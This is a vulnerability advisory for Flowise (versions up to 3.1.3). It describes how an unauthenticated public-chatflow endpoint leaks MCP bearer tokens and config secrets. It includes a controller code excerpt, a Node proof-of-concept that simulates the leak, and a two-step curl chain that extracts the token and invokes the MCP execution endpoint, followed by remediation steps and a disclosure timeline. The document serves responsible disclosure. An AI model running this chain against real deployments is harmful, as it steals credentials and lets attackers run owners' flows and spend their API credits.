https://github.com/FlowiseAI/Flowise

# Unauthenticated disclosure of MCP bearer token and config secrets via `GET /api/v1/public-chatflows/:id`

Affected versions: <= 3.1.3

## Summary

The unauthenticated public endpoint `GET /api/v1/public-chatflows/:id` returns the **entire ChatFlow database row** for any chatflow flagged `isPublic`, sanitizing only the `flowData` field. It does not strip `mcpServerConfig`, which holds the chatflow's **MCP bearer token** in plaintext. That token is the only credential gating the MCP execution endpoint `POST /api/v1/mcp/:chatflowId`, so an anonymous attacker can leak it and then invoke the chatflow as an MCP tool (running the agent/LLM flow with arbitrary input, burning the owner's API credits and reaching any tools/data the flow is wired to). `apikeyid`, `apiConfig`, `analytic`, `textToSpeech`, `speechToText` also leak.

## Details

`controllers/chatflows/index.ts:229-241` `getSinglePublicChatflow`, line 241:
```ts
return res.status(StatusCodes.OK).json({ ...chatflow, flowData: sanitizeFlowDataForPublicEndpoint(chatflow.flowData) })
```
It spreads the full row from `getChatflowById` (every column except `webhookSecret`, which alone has `select:false`); the sanitizer (`utils/sanitizeFlowData.ts:11`) only rewrites `flowData` nodes. `mcpServerConfig` (`database/entities/ChatFlow.ts:64-65`, plain `text`, stores `{enabled, token, ...}`) survives verbatim. The token gates `getChatflowByIdAndVerifyToken` (`services/mcp-server/index.ts:226-246`, constant-time compare only), used by the unauth MCP execution route. The route is whitelisted unauthenticated (`utils/constants.ts:9`).

Contrast: the intended `getSinglePublicChatbotConfig` (`/api/v1/public-chatbotConfig/:id`) returns only a whitelisted projection and never exposes `mcpServerConfig` — proving this is a logic gap.

Preconditions: chatflow `isPublic=true` (powers embedded/shared chatbots) + MCP server enabled (one-click on the same chatflow). Both common, independently set. No auth, no UI.

## PoC (validated)

`scripts/poc_mcp_token_leak.js` reproduces the exact controller spread + verbatim sanitizer:
```
flowData openAIApiKey stripped? -> true
LEAKED mcpServerConfig.token   -> a1b2c3d4e5f60718293a4b5c6d7e8f90  (=== minted secret)
LEAKED apikeyid / apiConfig / analytic -> ...
```
Live two-step chain:
```
TOKEN=$(curl -s "http://TARGET/api/v1/public-chatflows/<uuid>" | jq -r '.mcpServerConfig|fromjson|.token')
curl -s -X POST "http://TARGET/api/v1/mcp/<uuid>" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"<toolName>","arguments":{"question":"run as attacker"}}}'
```

## Net-new

Distinct from the file-storage path-traversal/MIME fix (CVE-2025-61687) and older missing-auth issues — all verified hardened. No advisory covers `public-chatflows` leaking `mcpServerConfig`. (File-storage SSRF/traversal, overrideConfig, constant-time MCP compare all audited clean.)

## Remediation

Return a whitelisted projection (like `getSinglePublicChatbotConfig`) from `getSinglePublicChatflow`; at minimum delete `mcpServerConfig`/`apiConfig`/`apikeyid`/`analytic` before responding, or add `select:false` to `mcpServerConfig`.


poc_mcp_token_leak.js: 
```

// PoC: unauthenticated mcpServerConfig.token leak in Flowise getSinglePublicChatflow
// Sink: packages/server/src/controllers/chatflows/index.ts:241 (spreads full row, only sanitizes flowData)
// Run: node poc_mcp_token_leak.js

// verbatim copy of sanitizeFlowDataForPublicEndpoint (utils/sanitizeFlowData.ts)
const sanitizeFlowDataForPublicEndpoint = (flowDataString) => {
  if (!flowDataString) return flowDataString
  try {
    const flowData = JSON.parse(flowDataString)
    if (!Array.isArray(flowData.nodes)) return flowDataString
    for (const node of flowData.nodes) {
      if (!node.data) continue
      delete node.data.credential
      const inputs = node.data.inputs
      if (!inputs) continue
      const inputParams = node.data.inputParams ?? []
      const sanitizedInputs = {}
      for (const key of Object.keys(inputs)) {
        const param = inputParams.find((p) => p.name === key)
        if (param && (param.type === 'password' || param.type === 'file' || param.type === 'folder')) continue
        sanitizedInputs[key] = inputs[key]
      }
      node.data.inputs = sanitizedInputs
    }
    return JSON.stringify(flowData)
  } catch { return JSON.stringify({ nodes: [], edges: [] }) }
}

const MCP_TOKEN = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'
const chatflow = {
  id: '6e1c1f0a-4b2c-4d3e-8f9a-0b1c2d3e4f50', name: 'Public Support Bot', isPublic: true,
  flowData: JSON.stringify({ nodes: [{ id: 'n1', data: { name: 'chatOpenAI', credential: 'cred-123',
    inputParams: [{ name: 'openAIApiKey', type: 'password' }],
    inputs: { openAIApiKey: 'sk-SUPERSECRET', modelName: 'gpt-4o' } } }], edges: [] }),
  apikeyid: 'apikey-row-uuid-xyz', apiConfig: '{"overrideConfig":{"status":true}}',
  analytic: '{"langSmith":{"credentialId":"ls-cred-uuid"}}',
  mcpServerConfig: JSON.stringify({ enabled: true, token: MCP_TOKEN, toolName: 'support_bot' })
}

// EXACT controller return for isPublic === true (chatflows controller :241)
const responseBody = { ...chatflow, flowData: sanitizeFlowDataForPublicEndpoint(chatflow.flowData) }
const leaked = JSON.parse(responseBody.mcpServerConfig)
console.log('flowData openAIApiKey stripped? ->', !responseBody.flowData.includes('sk-SUPERSECRET'))
console.log('LEAKED mcpServerConfig.token   ->', leaked.token, '(=== minted:', leaked.token === MCP_TOKEN, ')')
console.log('LEAKED apikeyid / apiConfig    ->', responseBody.apikeyid, responseBody.apiConfig)
if (leaked.token !== MCP_TOKEN) process.exit(1)
```

## Disclosure:

- 9 June 2026: private reported via https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-g73q-7934-63j7
- 9 June 2026: triaged and confirmed to be valid finding by maintainer
- 13 August 2026: report archived
- 4 September 2026: followed up

<img width="934" height="988" alt="image" src="https://github.com/user-attachments/assets/be19e60c-3883-444f-b6cb-a32745315271" />

